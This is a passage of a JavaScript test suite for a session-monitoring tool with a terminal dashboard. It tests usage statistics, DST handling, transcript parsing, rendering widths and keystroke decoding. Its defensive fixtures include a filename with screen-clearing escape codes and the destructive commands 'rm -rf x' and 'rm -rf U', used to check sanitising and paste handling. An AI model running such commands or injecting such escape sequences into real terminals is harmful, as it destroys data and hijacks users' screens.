  assert.equal(st.hourly[hr].messages, 1, 'hourly re-parsed as well');

  // A deleted transcript's entry must fall out of the cache file (no stale growth).
  const B = writeTranscript(home, 'projB', 'sessB', [assistantMsg(now)]);
  st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 2, 'second transcript counted');
  assert.ok(JSON.parse(fs.readFileSync(statsCachePath(), 'utf8')).files[B], 'cache has the new file');
  fs.unlinkSync(B);
  st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 1, 'deleted transcript no longer counted');
  const files = JSON.parse(fs.readFileSync(statsCachePath(), 'utf8')).files;
  assert.equal(files[B], undefined, 'deleted transcript pruned from the cache');
});

test('stats: a stale-day hourly block is pruned from the cache on the next day', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const now = Date.now();
  const A = writeTranscript(home, 'proj', 'sessH', [assistantMsg(now)]);
  core.computeStats(undefined, now);
  assert.ok(JSON.parse(fs.readFileSync(statsCachePath(), 'utf8')).files[A].hourly, 'hourly cached for today');
  // Next day: the file (mtime unchanged) can hold nothing for the NEW today -> hourly block pruned.
  const st = core.computeStats(undefined, now + 86400000);
  assert.equal(JSON.parse(fs.readFileSync(statsCachePath(), 'utf8')).files[A].hourly, undefined, 'stale hourly pruned');
  assert.equal(st.daily[28].messages, 1, "yesterday's daily aggregates still served from the cache");
  assert.equal(st.hourly.reduce((a, h) => a + h.messages, 0), 0, 'no hourly messages for the new day');
});

test('stats: midnight boundary — 23:xx activity stays in yesterday, not today (injected nowMs)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const t = new Date();
  t.setHours(0, 30, 0, 0); // "now" is 00:30 local
  const now = t.getTime();
  const yesterEve = now - 3600000; // 23:30 local, yesterday
  writeTranscript(home, 'proj', 'sessM', [assistantMsg(yesterEve)]);
  const S = 'sessM';
  core.ensureStore(S);
  const blob = core.writeBlob(S, Buffer.from('x\n'));
  core.appendLog(S, { id: 1, ts: yesterEve, tool: 'Edit', file: '/w/a.js', beforeBlob: null, afterBlob: blob, status: 'pending' });
  const st = core.computeStats(S, now);
  assert.equal(st.daily[29].day, dk(now), 'bucket 29 is today');
  assert.equal(st.daily[28].day, dk(yesterEve), 'bucket 28 is yesterday');
  assert.equal(st.daily[29].messages + st.daily[29].editsPending, 0, 'nothing leaks into today');
  assert.equal(st.daily[28].messages, 1, 'message lands in yesterday');
  assert.equal(st.daily[28].editsPending, 1, 'edit lands in yesterday');
  assert.equal(st.windows.day.edits, 0, "the 'today' window excludes yesterday 23:30");
  assert.equal(st.hourly.reduce((a, h) => a + h.editsPending + h.messages, 0), 0, 'hourly (today) is empty');
});

test('stats: daily series is DST-safe — no dropped day (spring) and no double-counted day (fall)', () => {
  const oldTZ = process.env.TZ;
  try {
    process.env.TZ = 'America/New_York';
    delete process.env.CLAUDE_CONFIG_DIR;
    // Spring forward (2026-03-08 has 23h): naive now-i*24h stepping SKIPS 03-08 entirely.
    let home = freshHome();
    let now = Date.parse('2026-03-09T00:30:00-04:00');
    writeTranscript(home, 'proj', 'sessS', [assistantMsg(Date.parse('2026-03-08T12:00:00-05:00'))]);
    let st = core.computeStats(undefined, now);
    assert.equal(new Set(st.daily.map((d) => d.day)).size, 30, '30 distinct day keys');
    const d8 = st.daily.find((d) => d.day === '2026-03-08');
    assert.ok(d8, 'the 23h spring-forward day is present in the series');
    assert.equal(d8.messages, 1, 'its data is not dropped');
    assert.equal(st.windows.month.messages, 1);

    // Fall back (2026-11-01 has 25h): naive stepping emits 11-01 TWICE -> double-counted windows.
    home = freshHome();
    now = Date.parse('2026-11-03T23:30:00-05:00');
    const p = writeTranscript(home, 'proj', 'sessF', [assistantMsg(Date.parse('2026-11-01T12:00:00-05:00'))]);
    fs.utimesSync(p, new Date(now - 1000), new Date(now - 1000)); // mtime inside the injected window
    st = core.computeStats(undefined, now);
    assert.equal(new Set(st.daily.map((d) => d.day)).size, 30, '30 distinct day keys (no duplicate 11-01)');
    assert.equal(st.daily.filter((d) => d.day === '2026-11-01').length, 1, 'the 25h day appears exactly once');
    assert.equal(st.windows.month.messages, 1, 'the fall-back day is not double-counted');
  } finally {
    if (oldTZ === undefined) delete process.env.TZ;
    else process.env.TZ = oldTZ;
  }
});

test('stats: inlined sidechain (subagent) turns are excluded from message/token counts', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const now = Date.now();
  writeTranscript(home, 'proj', 'sessSide', [
    assistantMsg(now, { sessionId: 'sessSide' }),
    assistantMsg(now, {
      sessionId: 'sessSide',
      isSidechain: true,
      usage: { input_tokens: 999999, cache_read_input_tokens: 999999, output_tokens: 88888 },
    }),
  ]);
  const st = core.computeStats('sessSide', now);
  assert.equal(st.daily[29].messages, 1, 'sidechain turn not counted as a message');
  assert.equal(st.daily[29].tokensOutput, 50, 'sidechain output tokens excluded');
  assert.equal(st.daily[29].tokensInput, 110, 'sidechain input/cache tokens excluded');
  assert.equal(st.windows.session.messages, 1, 'session window main-chain only');
  const hr = new Date(now).getHours();
  assert.equal(st.hourly[hr].messages, 1, 'hourly main-chain only');
});

test('stats: malformed usage values (strings) do not poison the sums', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const now = Date.now();
  writeTranscript(home, 'proj', 'sessBad', [
    assistantMsg(now, { usage: { input_tokens: '10', cache_read_input_tokens: null, output_tokens: '50' } }),
    assistantMsg(now),
  ]);
  const st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 2, 'both turns counted');
  assert.equal(st.daily[29].tokensOutput, 50, 'string token fields coerced to 0, not concatenated');
  assert.equal(st.daily[29].tokensInput, 110);
  assert.ok(Number.isFinite(st.windows.month.tokens), 'window sums stay numeric');
});

test('stats: transcriptFiles honors CLAUDE_CONFIG_DIR for the transcript scan', () => {
  const home = freshHome();
  const alt = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-cfg-'));
  try {
    process.env.CLAUDE_CONFIG_DIR = alt;
    const now = Date.now();
    const dir = path.join(alt, 'projects', 'p');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 's.jsonl'), JSON.stringify(assistantMsg(now)) + '\n');
    // nothing under $HOME/.claude/projects — the message must come from CLAUDE_CONFIG_DIR
    const st = core.computeStats(undefined, now);
    assert.equal(st.daily[29].messages, 1, 'transcripts read from CLAUDE_CONFIG_DIR');
    // Unified config dir: the store (and its stats-cache) now follows CLAUDE_CONFIG_DIR too, instead
    // of splitting the cache into the home ~/.claude while transcripts came from the relocated dir.
    assert.ok(fs.existsSync(path.join(alt, 'claude-observatory', 'stats-cache.json')), 'cache lives under the relocated store dir');
    assert.ok(!fs.existsSync(path.join(home, '.claude', 'claude-observatory', 'stats-cache.json')), 'not split back into home ~/.claude');
  } finally {
    delete process.env.CLAUDE_CONFIG_DIR;
  }
});

test('observe: usageLine survives a corrupt statusline-last.json and scans the transcript from the end', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  fs.writeFileSync(path.join(claudeDir, 'statusline-last.json'), '{"ts":123,"model":"Fab'); // truncated JSON
  const S = 'usagecorrupt';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    JSON.stringify({ message: { role: 'assistant', usage: { input_tokens: 1000, cache_read_input_tokens: 0 }, content: [] } }),
    JSON.stringify({ message: { role: 'assistant', usage: { input_tokens: 2000, cache_read_input_tokens: 38000 }, content: [] } }),
    JSON.stringify({ isSidechain: true, message: { role: 'assistant', usage: { input_tokens: 900000, cache_read_input_tokens: 0 }, content: [] } }),
    '{"broken":"usage"', // trailing garbage that still contains the "usage" prefilter token
    JSON.stringify({ type: 'user', message: { role: 'user', content: 'no usage here' } }),
  ].join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  const u = core.usageLine(cwd, S);
  assert.ok(u.ctx, 'fell back to the transcript despite the corrupt cache');
  assert.equal(u.ctx.tokens, 40000, 'LATEST main-chain usage line wins (2000+38000), sidechain + garbage skipped');
  assert.equal(u.fiveHourPct, null, '5h/week stay null on the fallback path');
});

test('observe: usageLine ignores wrong-typed fields in statusline-last.json', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const claudeDir = path.join(os.homedir(), '.claude');
  fs.mkdirSync(claudeDir, { recursive: true });
  fs.writeFileSync(
    path.join(claudeDir, 'statusline-last.json'),
    JSON.stringify({ ctx_pct: '42', five_pct: null, week_pct: 12, five_tok: 'lots' })
  );
  const u = core.usageLine(cwd, 'nosession');
  assert.equal(u.ctx, null, 'string ctx_pct rejected (no transcript to fall back on)');
  assert.equal(u.fiveHourPct, null, 'null five_pct rejected');
  assert.equal(u.weekPct, 12, 'valid week_pct still honored');
  assert.equal(u.fiveTokens, null, 'string five_tok rejected');
});

test('observe: transcriptInsights ignores inlined sidechain summaries and to-dos', () => {
  freshHome();
  const S = 'sideins';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = [
    { message: { role: 'assistant', content: [{ type: 'text', text: 'Main summary.' }] } },
    { isSidechain: true, message: { role: 'assistant', content: [
      { type: 'text', text: 'Subagent detail.' },
      { type: 'tool_use', name: 'TodoWrite', input: { todos: [{ content: 'subagent-only item', status: 'pending' }] } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), tx);
  const ins = core.transcriptInsights(cwd, S);
  assert.equal(ins.lastSummary, 'Main summary.', 'sidechain text does not override the main summary');
  assert.deepEqual(ins.todos, [], "sidechain TodoWrite does not become the session's plan");
});

test('observe: flagsFor accepts a prefetched log (and uses it)', () => {
  freshHome();
  const S = 'flaglog';
  const F = path.join(tmpWork(), 'svc2.js');
  seedEdit(S, F, null, 'export const a = 1\n');
  const rec = core.findRecord(S, 1);
  const log = core.readLog(S);
  assert.deepEqual(core.flagsFor(S, rec, log), core.flagsFor(S, rec), 'prefetched log gives identical flags');
  // Prove the param is really used: a synthetic log containing a test sibling suppresses the flag.
  const withTest = log.concat([{ ...rec, id: 99, file: F.replace(/\.js$/, '.test.js') }]);
  assert.ok(core.flagsFor(S, rec).some((f) => /no test file/.test(f.message)), 'store log alone flags missing tests');
  assert.ok(!core.flagsFor(S, rec, withTest).some((f) => /no test file/.test(f.message)), 'passed-in log wins');
});

/** A hand-built state, so a frame assertion is not hostage to whatever a real store happens to hold.
 *  The planted values are the hostile ones: a CJK path, an astral emoji, and an escape that would
 *  clear the screen if it reached the terminal unsanitised. */
function dashFixture(over = {}) {
  return {
    views: {
      changemap: { summary: { title: 'fixture', pending: 2, kept: 3 }, files: [{ rel: '漢字/テスト.ts', cnt: 2, added: 9, removed: 1, status: 'pending' }] },
      list: {
        edits: [
          { id: 1, ts: 1000, tool: 'Edit', file: 'src/a.ts', status: 'pending', added: 4, removed: 1 },
          { id: 2, ts: 2000, tool: 'Edit', file: 'src/\x1b[2J\x1b[1;1Hevil.ts', status: 'kept', added: 1, removed: 0 },
          { id: 3, ts: 3000, tool: 'Edit', file: 'src/🔬scope.ts', status: 'undone', added: 2, removed: 2 },
        ],
      },
      prompts: { prompts: [{ id: 'p1', index: 1, ts: 1000, title: 'do the thing', editIds: [1, 3] }] },
      multitask: { agents: [{ session: 's', phase: 'working', phaseConfidence: 'heuristic', diff: { added: 4, removed: 1 }, sparkline: '▁▂▅' }], summary: { active: 1, conflicts: 2 } },
      feed: { entries: [{ ts: 1000, label: 'ran tests' }], mode: 'live' },
      risk: { high: 1, count: 2, risky: [{ ts: 1, tool: 'Bash', target: 'rm -rf x', level: 'high', reasons: [] }], outsideWrites: [{ file: '/etc/hosts', count: 1 }] },
      egress: { remote: 1, channels: [{ kind: 'web', target: 'example.com', scope: 'remote', count: 1 }] },
    },
    screen: 'edits',
    cursor: 0,
    scroll: 0,
    session: 'fixture0',
    sessionTitle: 'fixture',
    filter: '',
    status: 'ready',
    error: null,
    confirm: null,
    now: 5_000_000,
    watcherMode: 'native',
    open: new Set(),
    ...over,
  };
}

/** Feed `chunks` through a fresh decoder and collect every event, including the flushed tail. */
function decode(chunks) {
  const d = tui.createDecoder();
  const out = [];
  for (const c of chunks) out.push(...d.push(c));
  out.push(...d.flush());
  return out;
}
const keysOf = (evs) => evs.filter((e) => e.t === 'key' && !e.ctrl && !e.alt).map((e) => e.key);

test('session: the terminal front door — repo-scoped inside a repo, machine-wide newest outside', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const repo = fs.realpathSync(tmpWork());
  fs.mkdirSync(path.join(repo, '.git')); // a workspace
  const desk = fs.realpathSync(tmpWork()); // no .git — "$HOME/Desktop"
  const write = (cwd, id, ts) => {
    const proj = core.projectDir(cwd);
    fs.mkdirSync(proj, { recursive: true });
    const p = path.join(proj, id + '.jsonl');
    fs.writeFileSync(
      p,
      [
        JSON.stringify({ type: 'user', sessionId: id, cwd, timestamp: new Date(ts).toISOString(), message: { role: 'user', content: 'hi' } }),
        JSON.stringify({ type: 'assistant', sessionId: id, timestamp: new Date(ts + 1).toISOString(), message: { role: 'assistant', id: 'm' + id, model: 'claude-opus-4-5', content: [], usage: {} } }),
      ].join('\n') + '\n'
    );
    fs.utimesSync(p, new Date(ts), new Date(ts));
  };
  write(repo, 'repoOld0', 1_000_000);
  write(desk, 'deskStale0', 500_000); // what the old walk-up would have found from the desk
  const other = fs.realpathSync(tmpWork());
  write(other, 'liveNow0', 2_000_000); // the machine-wide newest, in a different workspace
  assert.equal(core.defaultTuiSession(repo), 'repoOld0', 'inside a repo, the workspace rules — even with newer activity elsewhere');
  assert.equal(core.defaultTuiSession(desk), 'liveNow0', 'outside any repo, the machine-wide newest wins over ancestor leftovers');
});

test('tui/claude: the live tail renders — status row, feed rows, and the hint only when quiet', () => {
  const base = dashFixture();
  const live = {
    ...base,
    // The PANED layout, not the legacy single-screen chrome — the Claude window only exists there.
    panes: {
      minimized: tui.defaultMinimized(120, 48),
      zoom: null,
      focus: 'traces',
      tab: {},
      cursor: {},
      scroll: {},
      sizes: {},
    },
    views: {
      ...base.views,
      sessions: {
        active: 'fixture0',
        sessions: [{ id: 'fixture0', model: 'Opus 4.5', effort: 'high', active: true, tokens: 1234, durationMs: 60000 }],
      },
      multitask: { agents: [{ session: 'fixture0', self: true, phase: 'working', phaseConfidence: 'high' }], summary: {} },
      feed: {
        entries: [
          { ts: 4_990_000, kind: 'action', label: 'Edit src/a.ts', ok: true },
          { ts: 4_995_000, kind: 'reasoning', label: 'now the tests' },
          { ts: 4_996_000, kind: 'action', label: 'Bash npm test', ok: false },
        ],
        mode: 'live',
      },
    },
  };
  // 48 rows: tall enough that the Claude window OPENS (it folds below ~40) — every shorter frame
  // test exercises only the folded chip, which is how the whole body branch went untested.
  const frame = tui.renderDashFrame(live, { cols: 120, rows: 48, color: false }).join('\n');
  assert.match(frame, /Opus 4\.5/, 'the status row carries the model');
  assert.match(frame, /Edit src\/a\.ts/, 'a tool call lands in the tail');
  assert.match(frame, /now the tests/, 'assistant reasoning lands in the tail');
  assert.match(frame, /Bash npm test/, 'a failed call still shows');
  assert.ok(!/F1 again/.test(frame), 'a live tail spends no row on the resume hint');
  const quiet = { ...live, views: { ...live.views, feed: { entries: [], mode: 'live' } } };
  const frame2 = tui.renderDashFrame(quiet, { cols: 120, rows: 48, color: false }).join('\n');
  assert.match(frame2, /F1 again/, 'a quiet tail offers the door back to Claude');
});

test('tui/changemap: aggregates by path prefix, so nothing is dropped and every row fits', () => {
  // A top-N ledger looks complete while hiding most of the churn — on a real session its top twenty
  // rows covered 18.2%. A prefix tree instead guarantees that whatever is not on screen is still
  // represented by a visible ancestor carrying its totals.
  const files = [
    { rel: 'packages/core/src/observe.ts', added: 90, removed: 10, cnt: 4, pending: 2, kept: 2, undone: 0, risk: 1 },
    { rel: 'packages/core/src/memory.ts', added: 40, removed: 5, cnt: 2, pending: 0, kept: 2, undone: 0, risk: 0 },
    { rel: 'packages/cli/src/index.ts', added: 20, removed: 2, cnt: 1, pending: 1, kept: 0, undone: 0, risk: 0 },
    { rel: '../elsewhere/thing.md', added: 500, removed: 0, cnt: 9, pending: 0, kept: 9, undone: 0, risk: 0 },
  ];
  const tree = tui.buildMapTree(files);
  assert.equal(tree.files, 4, 'every file is counted');
  assert.equal(tree.churn, 667, 'and the root carries the whole session churn');

  // A path outside the workspace is one row, not a synthetic deep tree — on a real session those are
  // the agent's own harness directories and would otherwise bury the user's code entirely.
  const top = tui.mapRows(tree, new Set());
  const outside = top.find((r) => r.label === tui.OUTSIDE);
  assert.ok(outside, 'files outside the workspace collapse into one named row');
  assert.equal(outside.node.churn, 500, 'carrying their churn, so it is never silently dropped');

  // Collapsed by default: a folded folder still reports its subtree's totals.
  const pkgs = top.find((r) => r.label === 'packages');
  assert.equal(pkgs.node.churn, 167, 'a folded folder reports its whole subtree');
  assert.ok(pkgs.expandable, 'and says it can be opened');

  const opened = tui.mapRows(tree, new Set(['packages']));
  assert.ok(opened.length > top.length, 'opening it reveals children');

  // Width is the invariant that actually breaks: an off-by-one in the column arithmetic puts every
  // row one cell over its budget at every width, which no amount of reading catches — and the pane
  // then wraps every single row onto a continuation line carrying nothing.
  for (const tier of ['ascii', 'safe', 'block']) {
    const g = tui.glyphs(tier);
    for (let cols = 30; cols <= 200; cols++) {
      for (const r of tui.mapRows(tree, new Set(['packages', 'packages/core']))) {
        for (const line of tui.renderMapRow(r, cols, g, 'none')) {
          assert.ok(tui.displayWidth(line) <= cols, `${tier}@${cols}: "${line}" is ${tui.displayWidth(line)} wide`);
        }
      }
      assert.ok(tui.displayWidth(tui.mapHeader(tree, cols, g)) <= cols, `${tier}@${cols}: header fits`);
    }
  }
});

test('tui/changemap: every row states its lines and its review state, and offers the two actions', () => {
  const files = [
    { rel: 'packages/core/src/observe.ts', added: 90, removed: 10, cnt: 4, pending: 2, kept: 2, undone: 0, risk: 1 },
    { rel: 'packages/core/src/memory.ts', added: 40, removed: 5, cnt: 2, pending: 0, kept: 2, undone: 0, risk: 0 },
  ];
  const tree = tui.buildMapTree(files);
  // Added and removed are kept APART all the way up the tree: +900/−4 and +4/−900 are the same churn
  // and are not the same change, and a folder row is what a reviewer decides a whole package on.
  const pkgs = tui.mapRows(tree, new Set())[0];
  assert.equal(pkgs.node.added, 130, 'a folder sums its subtree additions');
  assert.equal(pkgs.node.removed, 15, 'and its deletions, separately');
  assert.equal(pkgs.node.churn, pkgs.node.added + pkgs.node.removed, 'churn stays their sum');
  assert.equal(pkgs.node.pending, 2, 'pending and kept roll up too');
  assert.equal(pkgs.node.kept, 4);

  const g = tui.glyphs('ascii');
  const wide = tui.renderMapRow(pkgs, 120, g, 'none')[0];
  assert.match(wide, /\+130/, 'the row states the lines added');
  assert.match(wide, /−15/, 'and the lines removed');
  assert.match(wide, new RegExp(`2\\${g.pending}`), 'and how many edits are still pending');
  assert.match(wide, new RegExp(`4\\${g.kept}`), 'and how many are accepted');

  // The actions are laid out ONCE and the row is drawn from that layout — a cell pressable somewhere
  // other than where it is drawn reverts a folder the reader never pointed at.
  const acts = tui.mapRowActions(pkgs, 120);
  assert.deepEqual(acts.map((a) => a.action), ['keep', 'undo'], 'both actions at a wide size');
  for (const a of acts) {
    assert.equal(wide.slice(a.x, a.x + a.w), a.label, `${a.action} is drawn exactly at its own cells`);
  }

  // The headings are built from the SAME layout the cells are, so a label can never sit over the
  // wrong number — which is the whole reason they exist.
  const head = tui.mapColumnHeader(120, g);
  for (const [label, cell] of [['added', '+130'], ['removed', '−15'], ['pend', `2${g.pending}`], ['kept', `4${g.kept}`]]) {
    const at = head.indexOf(label);
    assert.ok(at >= 0, `the heading names ${label}`);
    const under = wide.slice(at, at + label.length + 1);
    assert.ok(under.includes(cell.slice(0, 2)), `${label} sits over its own column (found ${JSON.stringify(under)})`);
  }
  // No meter. A proportional bar answered "which is biggest", which the churn-ranked ORDER already
  // answers, and it spent up to 27 columns doing it beside numbers that say the same thing.
  assert.ok(!/[#=─▇]{3}/.test(wide), `no bar in the row, got ${JSON.stringify(wide)}`);

  // Narrow: columns drop WHOLE, cheapest first, and the actions outlive the numbers.
  const seen = new Set();
  for (let cols = 30; cols <= 140; cols++) seen.add(JSON.stringify(tui.mapColumns(cols, 0)));
  assert.ok(seen.size >= 4, `the sweep must actually cross tiers, saw ${seen.size}`);
  assert.equal(tui.mapColumns(34, 0).review, 0, 'the review counts go before the actions do');
  assert.ok(tui.mapRowActions(pkgs, 46).length === 2, 'and the actions survive well past it');

  // A node with nothing pending cannot be kept or undone, and must not look like it can.
  const done = tui.buildMapTree([{ rel: 'a/b.ts', added: 1, removed: 0, cnt: 1, pending: 0, kept: 1, undone: 0, risk: 0 }]);
  const row = tui.mapRows(done, new Set())[0];
  const line = tui.renderMapRow(row, 120, g, 'none')[0];
  const at = tui.mapRowActions(row, 120)[0];
  assert.equal(line.slice(at.x, at.x + at.w).trim(), '', 'a resolved node draws blanks, not a promise it will refuse');
});

test('tui/glyphs: a meter never rounds a real class away, and colour is optional', () => {
  const g = tui.glyphs('ascii');
  // One pending edit in a large folder must still show: rounding it to zero cells would make the
  // meter claim the folder is fully reviewed, which is the opposite of true.
  const bar = tui.meter({ pending: 1, kept: 900, undone: 0 }, 20, g, 'none');
  assert.equal(tui.displayWidth(bar), 20, 'the bar fills its track exactly');
  assert.ok(bar.includes(g.fill.pending), 'and the single pending edit survives the rounding');
  // Shape carries the state, so accept and reject are distinguishable without any colour at all —
  // the answer to red/green colour blindness on this product's two most important states.
  assert.notEqual(g.kept, g.undone);
  assert.equal(tui.tint('x', 'risk', 'none'), 'x', 'NO_COLOR renders no escapes');
  assert.ok(tui.tint('x', 'risk', '256').includes('\x1b['), 'and colour is applied when available');
  assert.equal(tui.colorDepth({ NO_COLOR: '1', TERM: 'xterm-256color' }, true), 'none', 'NO_COLOR wins over TERM');
  // A sparkline from the numeric series the payload actually carries — the previous renderer passed
  // this array through a string coercion and drew nothing at all.
  assert.equal(tui.sparkline([0, 1, 2, 3], g).length, 4);
  assert.equal(tui.sparkline([], g), '');
});

test('tui/input: a non-keystroke sequence never reaches the keymap as a key', () => {
  // Each of these was measured arriving as ordinary letters in a scanner-based decoder. In an
  // application where a, u, A, U and R keep or revert real code, a terminal answering a capability
  // query it was never asked to answer must not be able to revert a session.
  const hostile = [
    ['\x1b[<0;12;34M', 'an SGR mouse click'],
    ['\x1b]11;rgb:1111/2222/3333\x07', 'a background-colour reply'],
    ['\x1b[?2026;2$y', 'a synchronised-output reply'],
    ['\x1b[?1;2c', 'a device-attributes reply'],
    ['\x1bP>|xterm\x1b\\', 'a DCS version report'],
  ];
  for (const [seq, what] of hostile) {
    const evs = decode([seq]);
    assert.deepEqual(keysOf(evs), [], `${what} produces no keys`);
  }
  // Positive control: the instrument can see keys, so the emptiness above is real.
  assert.deepEqual(keysOf(decode(['jkq'])), ['j', 'k', 'q'], 'ordinary characters still arrive');
});

test('tui/input: a sequence split across reads decodes identically to a whole one', () => {
  // The terminal splits wherever it likes. A decoder that re-scans each chunk sees `["\x1b[", "A"]`
  // as the letter A — which in this application is "keep everything".
  const whole = [
    '\x1b[A', '\x1bOB', '\x1b[1;5C', '\x1b[3~', '\x1b[<64;5;7M',
    '\x1b[200~pasted U text\x1b[201~', '\x1b]11;rgb:0/0/0\x07', '\x1b[I', 'x',
  ];
  for (const seq of whole) {
    const want = JSON.stringify(decode([seq]));
    for (let i = 1; i < seq.length; i++) {
      const split = [seq.slice(0, i), seq.slice(i)];
      assert.equal(JSON.stringify(decode(split)), want, `${JSON.stringify(seq)} split at ${i} must decode the same`);
    }
  }
});

test('tui/input: a paste is one event, and its end marker can arrive late', () => {
  // Two failures this pins. A paste decoded as keystrokes runs its content through the keymap —
  // pasting a path containing U then y would bulk-undo the session. And losing a split end marker
  // strands the decoder in paste mode, after which every keystroke is silently swallowed forever.
  const one = decode(['\x1b[200~rm -rf U\x1b[201~']);
  assert.deepEqual(keysOf(one), [], 'nothing inside a paste reaches the keymap');
  assert.deepEqual(one.filter((e) => e.t === 'paste').map((e) => e.text), ['rm -rf U']);

  const late = decode(['abc\x1b[200~xy\x1b[', '201~', 'jkq']);
  assert.deepEqual(late.filter((e) => e.t === 'paste').map((e) => e.text), ['xy'], 'the paste body is exact');
  assert.deepEqual(keysOf(late), ['a', 'b', 'c', 'j', 'k', 'q'], 'and the decoder is not stuck — later keys still arrive');
});

test('tui/input: mouse reports decode to zero-based cells, and a lone ESC needs the flush', () => {
  const [m] = decode(['\x1b[<0;12;34M']);
  assert.equal(m.t, 'mouse');
  assert.deepEqual([m.kind, m.col, m.row], ['down', 11, 33], 'the wire is 1-based; callers get cells');
  assert.equal(decode(['\x1b[<64;1;1M'])[0].kind, 'wheel-up');
  // ESC alone is the Escape key only once nothing follows it — otherwise every arrow key would first
  // fire an Escape.
  const d = tui.createDecoder();
  assert.deepEqual(d.push('\x1b'), [], 'held, not guessed');
  assert.equal(d.pending(), '\x1b');
  assert.deepEqual(d.flush().map((e) => e.key), ['escape']);
});

test('groups: an id set must be expanded, or a collapsed row half-resolves', () => {
  // What a surface shows as ONE row is often several raw records — reviewEdits collapses a same-code
  // chain into one unit and labels it with the most recent member's id. The `--ids` path is
  // group-unaware by design (it acts on raw records), so a surface that sends the displayed id alone
  // resolves one member and strands the others at an intermediate state no view can name. This pins
  // the expansion every id-set caller owes, using the same helper the single-id verbs use.
  freshHome();
  const S = 'grpexp';
  const F = path.join(tmpWork(), 'chain.js');
  const a = seedEdit(S, F, 'a\n', 'a\nb\n');
  const b = seedEdit(S, F, 'a\nb\n', 'a\n'); // net zero — collapses with the first

  const units = core.reviewEdits(S);
  assert.equal(units.length, 1, 'the chain is ONE review unit');
  assert.equal(units[0].id, b, 'labelled with the most recent member');

  const expanded = core.groupMembers(S, units[0].id);
  assert.deepEqual([...expanded].sort((x, y) => x - y), [a, b], 'expansion recovers every member');

  core.setStatusMany(S, expanded, 'kept');
  assert.equal(core.readLog(S).filter((r) => r.status === 'pending').length, 0, 'so nothing is left behind');

  // Positive control: without expansion the defect reappears, which is what makes the assertion above
  // meaningful rather than a restatement of setStatusMany.
  freshHome();
  const S2 = 'grpexp2';
  const F2 = path.join(tmpWork(), 'chain2.js');
  seedEdit(S2, F2, 'a\n', 'a\nb\n');
  const rep = seedEdit(S2, F2, 'a\nb\n', 'a\n');
  core.setStatusMany(S2, [rep], 'kept');
  assert.equal(core.readLog(S2).filter((r) => r.status === 'pending').length, 1, 'the unexpanded id strands a member');
});

test('dashframe: every screen fits its budget at every width', () => {
  for (const screen of ['edits', 'map', 'prompts', 'tasks', 'workflows', 'agents', 'feed', 'audit']) {
    for (const [cols, rows] of [[40, 24], [80, 30], [120, 40], [200, 50]]) {
      const frame = tui.renderDashFrame(dashFixture({ screen }), { cols, rows, color: false });
      assert.equal(frame.length, rows, `${screen} @${cols}x${rows}: a frame is exactly its height`);
      for (const line of frame) {
        // Measured by DISPLAY width, which is the only ruler that is right for CJK and colour. A line
        // one column too wide wraps, and every subsequent row of the frame is then off by one.
        assert.ok(tui.displayWidth(line) <= cols, `${screen} @${cols}: "${line.slice(0, 40)}…" overflows`);
      }
    }
  }
});

test('dashframe: no width silently truncates the key hints', () => {
  // A hand-written `cols >= 96` picked a hint measuring 100 columns and fit it to `cols - 1`, so
  // widths 96..100 cut the last keys off ("q qui") — invisibly, because a fit never reports. Spot
  // checks miss this; only a sweep finds a five-wide window. The renderer now picks by measurement.
  const st = dashFixture();
  const cut = [];
  for (let cols = 40; cols <= 200; cols++) {
    const frame = tui.renderDashFrame(st, { cols, rows: 24, color: false });
    const hint = frame[frame.length - 1].replace(/\s+$/, '');
    if (tui.displayWidth(hint) > cols - 1) cut.push({ cols, why: 'over budget' });
    // A hint that ends mid-word is a hint that was cut. Every candidate ends in "q" or "quit".
    else if (hint && !/(^\/|q$|quit$)/.test(hint)) cut.push({ cols, hint });
  }
  assert.deepEqual(cut, [], `widths whose hints were truncated: ${JSON.stringify(cut.slice(0, 6))}`);

  // Positive control: the sweep must be able to catch a too-long hint, or its silence proves nothing.
  const longHint = '1-8 screens · j/k move · enter open · a keep · u undo · A/U all · / filter · e $EDITOR · ? keys · q quit';
  assert.ok(tui.displayWidth(longHint) > 99, 'the widest hint really does exceed the budget at cols=100');
});

test('dashframe: the session leads the frame, and the picker keeps its columns', () => {
  // Everything below the top row is scoped to ONE session, so a reader who has not noticed which one
  // is selected can misread the whole screen. It leads the frame, and says it can be changed.
  const withSessions = dashFixture({
    views: { ...dashFixture().views, sessions: { active: 'fixture0', sessions: [{ id: 'fixture0' }, { id: 'other1' }] } },
  });
  const top = tui.renderDashFrame(withSessions, { cols: 90, rows: 12, color: false })[0];
  assert.match(top, /fixture/, 'the top row names the session in effect');
  assert.match(top, /2 sessions/, 'and says there are others to switch to');

  // A picker's cursor REPLACES the row's leading space. Prepending shifts every column right by one
  // and collides with the marker a row may already carry — two meanings sharing one glyph.
  const lines = [' * aaaaaaaa   1 pending  first', '   bbbbbbbb   2 pending  second'];
  const picking = dashFixture({ overlay: { title: 'switch session', lines, scroll: 0, cursor: 1 } });
  const frame = tui.renderDashFrame(picking, { cols: 60, rows: 9, color: false });
  const rows = frame.slice(4, 6);
  assert.ok(rows[1].startsWith('>  bbbbbbbb'), `cursor replaces the lead space: ${JSON.stringify(rows[1])}`);
  assert.ok(rows[0].startsWith(' * aaaaaaaa'), 'and the current-session marker is a different glyph, unshifted');
